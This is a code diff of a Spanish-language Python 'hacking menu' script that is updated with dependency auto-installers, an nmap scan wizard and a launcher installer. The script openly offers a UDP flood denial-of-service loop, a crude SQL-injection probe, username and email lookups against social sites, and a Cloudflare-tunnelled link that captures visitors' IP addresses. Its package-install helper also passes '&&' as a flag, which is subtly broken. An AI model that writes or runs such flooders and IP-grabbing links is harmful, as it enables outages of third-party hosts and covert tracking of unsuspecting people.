@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 import sys
 import subprocess
 import os
@@ -6,14 +7,23 @@ import socket
 import threading
 import time
 import signal
-import requests
 import random
 import platform
+import shlex
+import shutil
+import importlib
 from http.server import BaseHTTPRequestHandler, HTTPServer
+
+# Intentar importar requests y dns (se garantizarán más abajo)
+try:
+    import requests
+except Exception:
+    requests = None
+
 try:
     import dns.resolver
-except ImportError:
-    pass
+except Exception:
+    dns = None
 
 # --- Definición de códigos de color ANSI ---
 VERDE = "\033[92m"
@@ -22,16 +32,140 @@ ROJO = "\033[91m"
 AZUL = "\033[94m"
 RESET = "\033[0m"
 
-# --- Funciones de Utilidad ---
+# ------------------ UTILIDADES DE INSTALACIÓN ------------------ #
+def run_cmd(cmd, check=False):
+    """Ejecuta comando y devuelve (returncode, stdout, stderr)"""
+    try:
+        proc = subprocess.run(cmd, capture_output=True, text=True, check=check)
+        return proc.returncode, proc.stdout, proc.stderr
+    except subprocess.CalledProcessError as e:
+        return e.returncode, e.stdout if hasattr(e, 'stdout') else "", e.stderr if hasattr(e, 'stderr') else str(e)
+    except FileNotFoundError:
+        return 127, "", f"Command not found: {cmd[0]}"
+
+def is_tool_installed(tool_name):
+    """Comprueba si un ejecutable existe en PATH."""
+    return shutil.which(tool_name) is not None
+
+def try_package_manager_install(package_name):
+    """
+    Intenta instalar package_name usando pkg, apt o apt-get.
+    Devuelve True si alguna instalación parece exitosa.
+    """
+    managers = [
+        ('pkg', ['install', '-y']),
+        ('apt', ['update', '&&', 'apt', 'install', '-y']),  # preferimos update+install si apt está disponible
+        ('apt-get', ['install', '-y']),
+    ]
+    for mgr, flags in managers:
+        if shutil.which(mgr):
+            print(f"{AZUL}[*] Intentando instalar {package_name} con {mgr}...{RESET}")
+            try:
+                # Si flags contiene '&&' lo ejecutamos a través de shell
+                if '&&' in flags:
+                    # construir comando en shell
+                    cmd = f"{mgr} {' '.join([f for f in flags])} {package_name}"
+                    proc = subprocess.run(cmd, shell=True)
+                    if proc.returncode == 0:
+                        return True
+                else:
+                    cmd = [mgr] + flags + [package_name]
+                    proc = subprocess.run(cmd)
+                    if proc.returncode == 0:
+                        return True
+            except Exception:
+                continue
+    return False
+
+def try_pip_install(pip_pkg):
+    """Intenta instalar paquete Python con pip o pip3."""
+    pip_bins = ['pip3', 'pip']
+    for pip in pip_bins:
+        if shutil.which(pip):
+            print(f"{AZUL}[*] Intentando instalar paquete Python '{pip_pkg}' con {pip}...{RESET}")
+            try:
+                proc = subprocess.run([pip, 'install', pip_pkg])
+                if proc.returncode == 0:
+                    return True
+            except Exception:
+                continue
+    # intentar usar python -m pip
+    try:
+        proc = subprocess.run([sys.executable, '-m', 'pip', 'install', pip_pkg])
+        if proc.returncode == 0:
+            return True
+    except Exception:
+        pass
+    return False
+
+def ensure_python_package(pkgname, import_name=None):
+    """
+    Asegura que un paquete Python esté instalado e importable.
+    pkgname: nombre para pip install
+    import_name: nombre real para import (si distinto)
+    """
+    import_name = import_name or pkgname
+    try:
+        return importlib.import_module(import_name)
+    except Exception:
+        print(f"{AZUL}[*] Paquete Python '{import_name}' no encontrado. Intentando instalar...{RESET}")
+        if try_pip_install(pkgname):
+            try:
+                return importlib.import_module(import_name)
+            except Exception as e:
+                print(f"{ROJO}[!] Falló importar {import_name} después de la instalación: {e}{RESET}")
+                return None
+        else:
+            print(f"{ROJO}[!] No se pudo instalar '{pkgname}' con pip automáticamente.{RESET}")
+            return None
+
+def ensure_tool(tool, pkg_name=None, pip_pkg=None):
+    """
+    Asegura que exista un ejecutable en PATH.
+    - tool: nombre del ejecutable a buscar (ej. 'nmap')
+    - pkg_name: nombre del paquete del sistema para instalar (ej. 'nmap' o 'dnsutils')
+    - pip_pkg: nombre de paquete pip en caso de que haya versión Python alternativa (opcional)
+    Devuelve True si el ejecutable está disponible o fue instalado/asegurado.
+    """
+    if is_tool_installed(tool):
+        return True
+
+    print(f"{AZUL}[*] '{tool}' no está en PATH. Intentando instalar/asegurar...{RESET}")
+
+    # 1) Intentar instalación por gestor de paquetes si pkg_name proporcionado
+    if pkg_name:
+        ok = try_package_manager_install(pkg_name)
+        if ok and is_tool_installed(tool):
+            print(f"{VERDE}[+] {tool} instalado con éxito vía gestor de paquetes.{RESET}")
+            return True
+
+    # 2) Intentar pip si pip_pkg está dado
+    if pip_pkg:
+        if try_pip_install(pip_pkg):
+            # puede que pip instale un ejecutable en ~/.local/bin — intentar actualizar PATH temporalmente
+            if is_tool_installed(tool):
+                return True
+            # si no aparece el ejecutable pero importable, considerarlo instalado (para herramientas basadas en Python)
+            try:
+                importlib.import_module(pip_pkg)
+                return True
+            except Exception:
+                pass
+
+    # 3) Como último recurso, sugerir pasos manuales
+    print(f"{ROJO}[!] No se pudo instalar '{tool}' automáticamente.{RESET}")
+    print(f"{AZUL}Sugerencia:{RESET} Instala manualmente '{pkg_name or tool}' ó '{pip_pkg}', o ejecuta este script con privilegios si corresponde.")
+    return False
+
+# ------------------ FIN UTILIDADES DE INSTALACIÓN ------------------ #
+
 def clear_screen():
-    """Limpia la pantalla de la terminal."""
     if platform.system() == "Windows":
         os.system('cls')
     else:
         os.system('clear')
 
 def print_banner():
-    """Imprime el banner principal."""
     clear_screen()
     print(f"""{VERDE}
 
@@ -45,44 +179,7 @@ def print_banner():
 
 {RESET}""")
 
-def is_tool_installed(tool_name):
-    """Comprueba si una herramienta está instalada en el sistema."""
-    try:
-        subprocess.run([tool_name, '--version'], check=True, capture_output=True, text=True)
-        return True
-    except (FileNotFoundError, subprocess.CalledProcessError):
-        return False
-
-def install_dependency(package_name, tool_name=None):
-    """Intenta instalar un paquete usando múltiples gestores."""
-    if tool_name is None:
-        tool_name = package_name
-    
-    if is_tool_installed(tool_name):
-        print(f"{VERDE}[+] La herramienta {tool_name} ya está instalada.{RESET}")
-        return True
-
-    package_managers = [
-        {'command': 'pkg', 'install_flags': ['install', '-y']},
-        {'command': 'apt', 'install_flags': ['install', '-y']},
-        {'command': 'apt-get', 'install_flags': ['install', '-y']}
-    ]
-
-    print(f"\n{AZUL}[*] {tool_name} no encontrado. Intentando instalar automáticamente...{RESET}")
-    for pm in package_managers:
-        try:
-            print(f"[*] Probando con el gestor de paquetes '{pm['command']}'...")
-            subprocess.run([pm['command']] + pm['install_flags'] + [package_name], check=True)
-            print(f"{VERDE}[+] Instalación de {tool_name} completada con {pm['command']}.{RESET}")
-            return True
-        except (FileNotFoundError, subprocess.CalledProcessError):
-            continue
-            
-    print(f"{ROJO}[!] No se pudo instalar {tool_name}. Ningún gestor de paquetes compatible encontrado.{RESET}")
-    return False
-
 def create_sites_file():
-    """Crea el archivo de sitios si no existe."""
     if not os.path.exists("sitios_usuarios.txt"):
         print(f"\n{AZUL}[*] Archivo 'sitios_usuarios.txt' no encontrado. Creando uno por defecto...{RESET}")
         with open("sitios_usuarios.txt", "w") as f:
@@ -93,12 +190,12 @@ def create_sites_file():
             f.write("LinkedIn,https://www.linkedin.com/in/{}\n")
         print(f"{VERDE}[+] Archivo creado con éxito.{RESET}")
 
-# --- Funciones de Ataque y Reconocimiento ---
+# --- FUNCIONES PRINCIPALES (las tuyas, ajustadas para usar ensure_tool / ensure_python_package) --- #
+
 def buscar_usuario():
     username = input(f"{AZUL}[*] Ingresa el nombre de usuario a buscar: {RESET}")
     print(f"[*] Buscando el nombre de usuario {AZUL}{username}{RESET}...")
     sitios_encontrados = []
-    
     try:
         with open("sitios_usuarios.txt", "r") as f:
             lineas = f.readlines()
@@ -114,8 +211,14 @@ def buscar_usuario():
             nombre_sitio, url_base = linea.split(",", 1)
             url_perfil = url_base.format(username)
             print(f"[*] Probando {nombre_sitio}...")
+            # Asegurar requests
+            global requests
+            if requests is None:
+                requests = ensure_python_package('requests', 'requests')
+                if requests is None:
+                    print(f"{ROJO}[!] No se puede continuar sin 'requests'.{RESET}")
+                    return sitios_encontrados
             response = requests.get(url_perfil, timeout=5)
-            
             if response.status_code == 200:
                 print(f"{VERDE}[+] Usuario '{username}' ENCONTRADO en {nombre_sitio}{RESET}")
                 sitios_encontrados.append(url_perfil)
@@ -131,9 +234,12 @@ def buscar_correo():
     print("---")
 
     if "@" in email and "." in email:
-        if not is_tool_installed('holehe'):
-            install_dependency('holehe')
-        
+        # asegurar holehe (es paquete pip)
+        ok = ensure_tool('holehe', pkg_name=None, pip_pkg='holehe')
+        if not ok:
+            print(f"{ROJO}[!] No se pudo instalar 'holehe'. Puedes intentar: pip install holehe{RESET}")
+            return
+
         try:
             proceso = subprocess.run(['holehe', email], capture_output=True, text=True, check=True)
             salida_holehe = proceso.stdout
@@ -166,10 +272,18 @@ def track_ip(ip_address=None):
         ip_address = input(f"{AZUL}[*] Ingresa la dirección IP a rastrear: {RESET}")
     print(f"[*] Rastreo de IP en progreso para: {AZUL}{ip_address}{RESET}")
     print("---")
+    # asegurar requests
+    global requests
+    if requests is None:
+        requests = ensure_python_package('requests', 'requests')
+        if requests is None:
+            print(f"{ROJO}[!] No se puede continuar sin 'requests'.{RESET}")
+            return
+
     try:
         response = requests.get(f"http://ip-api.com/json/{ip_address}", timeout=5)
         data = response.json()
-        if data['status'] == 'success':
+        if data.get('status') == 'success':
             print(f"{VERDE}[+] Información de IP encontrada:{RESET}")
             print(f"  - País: {data.get('country')}")
             print(f"  - Ciudad: {data.get('city')}")
@@ -188,6 +302,14 @@ def scan_vulnerability():
     print(f"\n[*] Analizando vulnerabilidad de inyección SQL en: {AZUL}{url}{RESET}")
     payloads = ["'", "''", '"', '""']
     sql_errors = ["SQL syntax", "mysql_fetch_array()", "Warning: mysql_query()"]
+    # asegurar requests
+    global requests
+    if requests is None:
+        requests = ensure_python_package('requests', 'requests')
+        if requests is None:
+            print(f"{ROJO}[!] No se puede continuar sin 'requests'.{RESET}")
+            return
+
     try:
         for payload in payloads:
             test_url = f"{url}'" if '?' not in url else f"{url}{payload}"
@@ -264,9 +386,10 @@ def get_ip_from_link():
     time.sleep(1)
     print("[*] Servidor local iniciado.")
     
-    if not is_tool_installed('cloudflared'):
-        if not install_dependency('cloudflared', 'Cloudflared'):
-            return
+    # asegurar cloudflared
+    if not ensure_tool('cloudflared', pkg_name='cloudflared', pip_pkg=None):
+        print(f"{ROJO}[!] cloudflared no disponible. Instálalo manualmente si quieres usar túneles.{RESET}")
+        return
     
     print(f"\n[*] Levantando un túnel público con Cloudflare...")
     try:
@@ -291,7 +414,10 @@ def get_ip_from_link():
         if public_url:
             process.wait()
         else:
-            error_output = process.stderr.read()
+            try:
+                error_output = process.stderr.read()
+            except Exception:
+                error_output = ""
             print(f"{ROJO}[!] No se pudo obtener el enlace del túnel. Salida de error:\n{error_output}{RESET}")
             process.kill()
     except FileNotFoundError:
@@ -325,20 +451,16 @@ def network_flood():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         packet = random._urandom(1024)
-        
         while time.time() < start_time + duration:
             s.sendto(packet, (ip, port))
             packet_count += 1
-            
         s.close()
-        
     except socket.gaierror:
         print(f"\n{ROJO}[!] ERROR: Dirección o nombre de host inválido.{RESET}")
     except Exception as e:
         print(f"\n{ROJO}[!] ERROR: Ocurrió un error inesperado: {e}{RESET}")
     finally:
         print(f"\n[+] Inundación finalizada. Paquetes enviados: {packet_count}")
-
 
 def get_website_info():
     url = input(f"{AZUL}[*] Ingresa la URL o dominio del sitio web (ej. google.com): {RESET}")
@@ -349,87 +471,241 @@ def get_website_info():
     
     domain = url.split("//")[-1].split("/")[0]
 
+    # asegurar requests antes de proceder
+    global requests
+    if requests is None:
+        requests = ensure_python_package('requests', 'requests')
+        if requests is None:
+            print(f"{ROJO}[!] Necesitas 'requests' para obtener info del sitio.{RESET}")
+            return
+
     try:
-        # Obtener IP
         ip_address = socket.gethostbyname(domain)
         print(f"{VERDE}[+] Dirección IP:{RESET} {ip_address}")
-
-        # Obtener información de headers HTTP y ordenar
         print(f"\n[*] Headers del servidor...")
         try:
             response = requests.get(url, timeout=5)
             headers = response.headers
-            
-            # Encabezados clave que queremos mostrar
             key_headers = [
-                'Server',
-                'Content-Type',
-                'Content-Length',
-                'Date',
-                'Cache-Control',
-                'X-Frame-Options',
-                'Content-Encoding'
+                'Server','Content-Type','Content-Length','Date',
+                'Cache-Control','X-Frame-Options','Content-Encoding'
             ]
-            
-            # Itera sobre el diccionario para una salida más limpia
             for key in key_headers:
                 value = headers.get(key, 'No disponible')
                 print(f"  - {key}: {value}")
-
         except requests.exceptions.RequestException as e:
             print(f"{ROJO}[-] No se pudo obtener headers: {e}{RESET}")
 
-        # Obtener geolocalización de la IP
         print(f"\n[*] Geolocalización de la IP...")
         track_ip(ip_address)
         
-        # Obtener servidores DNS (NS records)
         print(f"\n[*] Servidores DNS (NS)...")
-        if not is_tool_installed('dig'):
-            install_dependency('dnsutils', 'dig')
-            
-        try:
-            result = subprocess.run(['dig', '+short', domain, 'NS'], capture_output=True, text=True, check=True)
-            if result.stdout:
-                for line in result.stdout.strip().split('\n'):
-                    print(f"  - {line}")
-            else:
-                print(f"{ROJO}[-] No se encontraron registros NS para el dominio.{RESET}")
-        except Exception as e:
-            print(f"{ROJO}[-] No se pudo resolver los registros DNS: {e}{RESET}")
+        # asegurar dig (dnsutils)
+        if not ensure_tool('dig', pkg_name='dnsutils', pip_pkg=None):
+            print(f"{ROJO}[!] 'dig' no disponible. Saltando verificación NS.{RESET}")
+        else:
+            try:
+                result = subprocess.run(['dig', '+short', domain, 'NS'], capture_output=True, text=True, check=True)
+                if result.stdout:
+                    for line in result.stdout.strip().split('\n'):
+                        print(f"  - {line}")
+                else:
+                    print(f"{ROJO}[-] No se encontraron registros NS para el dominio.{RESET}")
+            except Exception as e:
+                print(f"{ROJO}[-] No se pudo resolver los registros DNS: {e}{RESET}")
 
     except socket.gaierror:
         print(f"{ROJO}[!] ERROR: No se pudo resolver la dirección del sitio web.{RESET}")
     except Exception as e:
         print(f"{ROJO}[!] Ocurrió un error inesperado: {e}{RESET}")
-        
+
 def install_tool():
-    """Instala el script de ejecución 'Fh' para usar la herramienta como un comando."""
-    install_path = "/data/data/com.termux/files/usr/bin/Fh"
+    """
+    Instala un lanzador 'Fh' para ejecutar el script desde cualquier lugar.
+    Funciona en Linux (incl. Termux), macOS y Windows.
+    """
     script_path = os.path.abspath(__file__)
-    
-    fh_content = f"""#!/bin/bash
-python3 {script_path}
-"""
+    home = os.path.expanduser("~")
+    system = platform.system().lower()
+
+    # Rutas candidatas por sistema (ordenadas por prioridad)
+    candidates = []
+    if "termux" in sys.platform or "android" in system:
+        candidates.append("/data/data/com.termux/files/usr/bin")
+    candidates += ["/usr/local/bin", "/usr/bin", "/bin", "/opt/homebrew/bin"]
+    candidates.append(os.path.join(home, "bin"))
+    if system == "windows":
+        appdata = os.environ.get("APPDATA")
+        localappdata = os.environ.get("LOCALAPPDATA")
+        userprofile = os.environ.get("USERPROFILE", home)
+        if localappdata:
+            candidates.insert(0, os.path.join(localappdata, "Programs"))
+        candidates.insert(0, userprofile)
+
+    # Filtrar únicos y absolutos
+    seen = set(); filtered = []
+    for p in candidates:
+        if p and os.path.isabs(p) and p not in seen:
+            filtered.append(p); seen.add(p)
+    candidates = filtered
+
+    chosen = None
+    for d in candidates:
+        try:
+            if d.endswith(os.path.join("", "bin")) and not os.path.exists(d):
+                os.makedirs(d, exist_ok=True)
+            if os.path.isdir(d) and os.access(d, os.W_OK):
+                chosen = d; break
+        except Exception:
+            continue
+
+    if not chosen:
+        fallback = os.path.join(home, "bin")
+        try:
+            os.makedirs(fallback, exist_ok=True)
+            if os.access(fallback, os.W_OK):
+                chosen = fallback
+        except Exception:
+            chosen = None
+
+    if not chosen:
+        print(f"\n{ROJO}[!] No se encontró un directorio de instalación escribible automáticamente.{RESET}")
+        print("Puedes ejecutar este script como root (sudo) o crear manualmente ~/bin y añadirlo a tu PATH.")
+        input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
+        return
+
     try:
-        with open(install_path, "w") as f:
-            f.write(fh_content)
-        os.chmod(install_path, 0o755)  # Dar permisos de ejecución
-        print(f"\n{VERDE}[+] ¡Instalación completada!{RESET}")
-        print(f"[*] Ahora puedes usar tu herramienta desde cualquier lugar escribiendo: {AZUL}Fh{RESET}")
-        input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
+        if system == "windows":
+            launcher_path = os.path.join(chosen, "Fh.bat")
+            bat_content = f'@echo off\r\npython "{script_path}" %*\r\n'
+            with open(launcher_path, "w", newline="\r\n") as f:
+                f.write(bat_content)
+            print(f"\n{VERDE}[+] Lanzador creado en: {launcher_path}{RESET}")
+        else:
+            launcher_path = os.path.join(chosen, "Fh")
+            sh_content = f"#!/usr/bin/env bash\npython3 \"{script_path}\" \"$@\"\n"
+            with open(launcher_path, "w", newline="\n") as f:
+                f.write(sh_content)
+            try:
+                os.chmod(launcher_path, 0o755)
+            except Exception:
+                pass
+            print(f"\n{VERDE}[+] Lanzador creado en: {launcher_path}{RESET}")
+            # Si elegimos ~/bin y no está en PATH, añadir en ~/.profile
+            if chosen == os.path.join(home, "bin"):
+                path_env = os.environ.get("PATH", "")
+                if os.path.join(home, "bin") not in path_env:
+                    profile = os.path.join(home, ".profile")
+                    line = '\n# Added by FernandoHub installer\nexport PATH="$HOME/bin:$PATH"\n'
+                    try:
+                        with open(profile, "a") as f:
+                            f.write(line)
+                        print(f"{AZUL}Nota:{RESET} Se añadió ~/bin a {profile}. Cierra y vuelve a abrir tu terminal para que se aplique.")
+                    except Exception:
+                        print(f"{ROJO}[!] No se pudo modificar {profile}. Añade manualmente: export PATH=\"$HOME/bin:$PATH\"{RESET}")
     except PermissionError:
-        print(f"\n{ROJO}[!] ERROR: Permiso denegado.{RESET}")
-        print("[-] No tienes los permisos necesarios para escribir en el directorio de sistema.")
-        print("[-] Por favor, ejecuta el script de instalación con privilegios de root (si es necesario).")
+        print(f"\n{ROJO}[!] Permiso denegado al intentar escribir en {chosen}.{RESET}")
+        if system != "windows":
+            print(f"{AZUL}Sugerencia:{RESET} Reintenta con permisos elevados:\n  sudo python3 {script_path}")
         input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
+        return
     except Exception as e:
         print(f"\n{ROJO}[!] Ocurrió un error durante la instalación: {e}{RESET}")
         input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
+        return
 
+    print(f"\n{VERDE}[+] Instalación finalizada. Ahora intenta ejecutar: {AZUL}Fh{RESET}")
+    input(f"\n{BLANCO}Presiona Enter para continuar...{RESET}")
 
+# --- NUEVA FUNCIÓN: Escaneo con nmap preguntando parámetros ---
+def scan_with_nmap():
+    target = input(f"{AZUL}[*] Ingresa la IP o dominio a escanear con nmap: {RESET}").strip()
+    if not target:
+        print(f"{ROJO}[!] Objetivo vacío. Cancelando.{RESET}")
+        return
+
+    # asegurar nmap (pkg apt o apt-get) - si no existe intenta instalar
+    if not ensure_tool('nmap', pkg_name='nmap', pip_pkg=None):
+        print(f"{ROJO}[!] nmap no disponible. Instálalo manualmente o con el gestor de paquetes de tu sistema.{RESET}")
+        return
+
+    print("\nElige el tipo de escaneo:")
+    print("  1) TCP SYN (-sS)")
+    print("  2) TCP connect (-sT)")
+    print("  3) UDP (-sU)")
+    print("  4) Rápido (-F)")
+    print("  5) Ninguno / personalizado")
+    scan_type = input(f"{AZUL}Opción [1-5] (enter=1): {RESET}").strip() or "1"
+    flags = []
+    if scan_type == "1":
+        flags.append("-sS")
+    elif scan_type == "2":
+        flags.append("-sT")
+    elif scan_type == "3":
+        flags.append("-sU")
+    elif scan_type == "4":
+        flags.append("-F")
+    elif scan_type == "5":
+        pass
+    else:
+        print(f"{ROJO}Opción no válida, usando -sS por defecto.{RESET}")
+        flags.append("-sS")
+
+    ports = input(f"{AZUL}¿Especificar puertos? (ej: 22,80,1-1024) [enter = ninguno]: {RESET}").strip()
+    if ports:
+        flags.extend(["-p", ports])
+
+    sV = input(f"{AZUL}Detectar versión de servicios (-sV)? [s/N]: {RESET}").strip().lower()
+    if sV.startswith('s'):
+        flags.append("-sV")
+
+    do_O = input(f"{AZUL}Detección de SO (-O)? [s/N]: {RESET}").strip().lower()
+    if do_O.startswith('s'):
+        flags.append("-O")
+
+    do_Pn = input(f"{AZUL}Omitir discovery/ping (-Pn)? [s/N]: {RESET}").strip().lower()
+    if do_Pn.startswith('s'):
+        flags.append("-Pn")
+
+    print("\nVelocidad/timing (impacta detección y ruido):")
+    print("  1) T0  2) T1  3) T2  4) T3 (default)  5) T4  6) T5")
+    timing = input(f"{AZUL}Elige 1-6 (enter=4): {RESET}").strip() or "4"
+    timing_map = {"1":"-T0","2":"-T1","3":"-T2","4":"-T3","5":"-T4","6":"-T5"}
+    flags.append(timing_map.get(timing, "-T3"))
+
+    extra = input(f"{AZUL}Opciones extra crudas (ej: --script vuln) [enter = none]: {RESET}").strip()
+    extra_list = []
+    if extra:
+        try:
+            extra_list = shlex.split(extra)
+        except ValueError:
+            print(f"{ROJO}Error al parsear opciones extra. Se ignorarán.{RESET}")
+            extra_list = []
+
+    save_file = input(f"{AZUL}Guardar salida en archivo (ej: salida.txt) [enter = no]: {RESET}").strip()
+    out_args = []
+    if save_file:
+        out_args = ["-oN", save_file]
+
+    cmd = ["nmap"] + flags + extra_list + out_args + [target]
+    print(f"\n{AZUL}Comando a ejecutar:{RESET} {' '.join(shlex.quote(x) for x in cmd)}")
+    confirm = input(f"{AZUL}¿Ejecutar ahora? [s/N]: {RESET}").strip().lower()
+    if not confirm.startswith('s'):
+        print(f"{ROJO}Escaneo cancelado.{RESET}")
+        return
+
+    try:
+        proc = subprocess.run(cmd, check=False)
+        print(f"\n{VERDE}Escaneo finalizado. Código de salida: {proc.returncode}{RESET}")
+        if save_file:
+            print(f"{VERDE}Salida guardada en: {save_file}{RESET}")
+    except KeyboardInterrupt:
+        print(f"\n{ROJO}Escaneo cancelado por usuario.{RESET}")
+    except Exception as e:
+        print(f"{ROJO}Ocurrió un error al ejecutar nmap: {e}{RESET}")
+
+# --- Menú principal ---
 def show_menu():
-    """Muestra el menú principal y maneja la entrada del usuario."""
     while True:
         print_banner()
         print(f"{VERDE}Menú de Opciones:{RESET}")
@@ -441,9 +717,10 @@ def show_menu():
         print(f"6. {AZUL}Realizar ataque de inundación (DoS){RESET}")
         print(f"7. {AZUL}Obtener información de un sitio web{RESET}")
         print(f"8. {AZUL}Instalar la herramienta (comando Fh){RESET}")
-        print(f"9. {ROJO}Salir{RESET}")
+        print(f"9. {AZUL}Escanear con nmap{RESET}")
+        print(f"10. {ROJO}Salir{RESET}")
 
-        choice = input(f"\n{AZUL}Selecciona una opción (1-9): {RESET}")
+        choice = input(f"\n{AZUL}Selecciona una opción (1-10): {RESET}")
 
         if choice == '1':
             buscar_usuario()
@@ -462,6 +739,8 @@ def show_menu():
         elif choice == '8':
             install_tool()
         elif choice == '9':
+            scan_with_nmap()
+        elif choice == '10':
             print(f"\n{VERDE}[+] ¡Gracias por usar la herramienta!{RESET}")
             sys.exit()
         else:
@@ -472,9 +751,16 @@ def show_menu():
 # --- Punto de Entrada Principal ---
 if __name__ == "__main__":
     try:
+        # Asegurar módulos Python críticos al inicio para evitar errores silenciosos
+        if requests is None:
+            requests = ensure_python_package('requests', 'requests')
+        if dns is None:
+            # dnspython proporciona dns.resolver
+            dns = ensure_python_package('dnspython', 'dns')
         create_sites_file()
         show_menu()
     except KeyboardInterrupt:
         print(f"\n{ROJO}[!] Interrupción por el usuario. Saliendo...{RESET}")
         sys.exit(1)
+
 print(" ")
